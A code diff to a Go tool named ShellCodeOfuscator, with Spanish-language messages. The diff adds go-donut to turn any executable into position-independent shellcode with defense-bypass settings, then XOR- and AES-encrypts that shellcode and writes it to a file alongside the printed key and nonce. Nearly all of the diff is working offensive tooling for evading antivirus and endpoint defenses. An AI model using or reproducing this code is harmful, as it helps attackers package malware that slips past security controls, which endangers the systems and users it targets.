@@ -4,16 +4,20 @@ import (
 	"crypto/rand"
 	"encoding/base64"
 	"flag"
+	"io"
 	"log"
 	"os"
+	"strings"
 	"time"
 
+	"github.com/Binject/go-donut/donut"
 	"github.com/Fatake/ShellCodeOfuscator/coder"
 	"github.com/fatih/color"
 )
 
 type FlagsType struct {
 	inputFile string
+	arch      string
 }
 
 var banner = `
@@ -30,12 +34,12 @@ by Fatake
 
 func opciones() *FlagsType {
 	inputFile := flag.String("f", "", "Ruta del binario a ofuscar")
+	archstring := flag.String("a", "x84", "Arquitectura para generar shellcode Targ: x32,x64,x84")
 	flag.Parse()
-	return &FlagsType{*inputFile}
+	return &FlagsType{*inputFile, *archstring}
 }
 
-func main() {
-	color.Cyan(banner)
+func getdata() ([]byte, *FlagsType) {
 	menu := opciones()
 	if menu.inputFile == "" {
 		log.Fatal("[!] Requiere binario, user -h para ver la ayuda")
@@ -45,11 +49,67 @@ func main() {
 	if err != nil {
 		log.Fatal(err)
 	}
+	return dataFile, menu
+}
 
+func main() {
+	color.Cyan(banner)
+	dataFile, menu := getdata()
+	/*
+		Donut is a position-independent code that enables in-memory execution of
+		VBScript, JScript, EXE, DLL files and dotNET assemblies
+	*/
+	var donutarch donut.DonutArch
+	switch strings.ToLower(menu.arch) {
+	case "x32", "386":
+		donutarch = donut.X32
+
+	case "x64", "amd64":
+		donutarch = donut.X64
+
+	case "x84":
+		donutarch = donut.X84
+	default:
+		log.Fatal("[!] Arquitectura No soportada para generacion de payloads")
+	}
+
+	color.Blue("[i] Generando payload con donut")
+	config := new(donut.DonutConfig)
+	config.Arch = donutarch
+	config.Entropy = donut.DONUT_ENTROPY_DEFAULT
+	config.InstType = donut.DONUT_INSTANCE_PIC
+	config.Type = donut.DONUT_MODULE_EXE
+	config.Bypass = 3
+	config.Format = 1
+	config.Compress = 1
+
+	payload, err := donut.ShellcodeFromFile(menu.inputFile, config)
+	if err != nil {
+		log.Println(err)
+	}
+
+	readBuf, _ := io.ReadAll(payload)
+	encrypt := coder.XorEncoder(readBuf, 31)
+	key := make([]byte, 32)
+	nonce := make([]byte, 12)
+	rand.Read(key)
+	rand.Read(nonce)
+
+	raw2 := coder.AESEncrypt(encrypt, key, nonce)
+
+	color.Blue("[i] Realizando proceso de cifrado AES")
+
+	time.Sleep(4 * time.Second)
+	color.Green("[+] Key: " + base64.StdEncoding.EncodeToString(key))
+	color.Green("[+] nonce: " + base64.StdEncoding.EncodeToString(nonce))
+
+	os.WriteFile("shellcode.txt", raw2, 0644)
+
+	color.Blue("[+] Shellcode Generado")
 	////
 	// XOR Part
 	////
-	color.Blue("[i] Realizando proceso de cifrado Xor")
+	color.Blue("\n[i] Realizando proceso de cifrado Xor")
 	cifrar := coder.XorEncoder(dataFile, 60)
 
 	// obs es la variable que contiene el resultado final de la obfuscacion
@@ -57,18 +117,5 @@ func main() {
 
 	os.WriteFile("obs.txt", []byte(obs), 0777)
 	color.Yellow("[+] Archivo Ofuscado Exitosamente")
-
-	////
-	// AES Part
-	////
-	color.Blue("[i] Realizando proceso de cifrado AES")
-	key := make([]byte, 32)
-	nonce := make([]byte, 12)
-
-	rand.Read(key)
-	rand.Read(nonce)
-	time.Sleep(2 * time.Second)
-	color.Green("[+] Key: " + base64.StdEncoding.EncodeToString(key))
-	color.Green("[+] nonce: " + base64.StdEncoding.EncodeToString(nonce))
 
 }
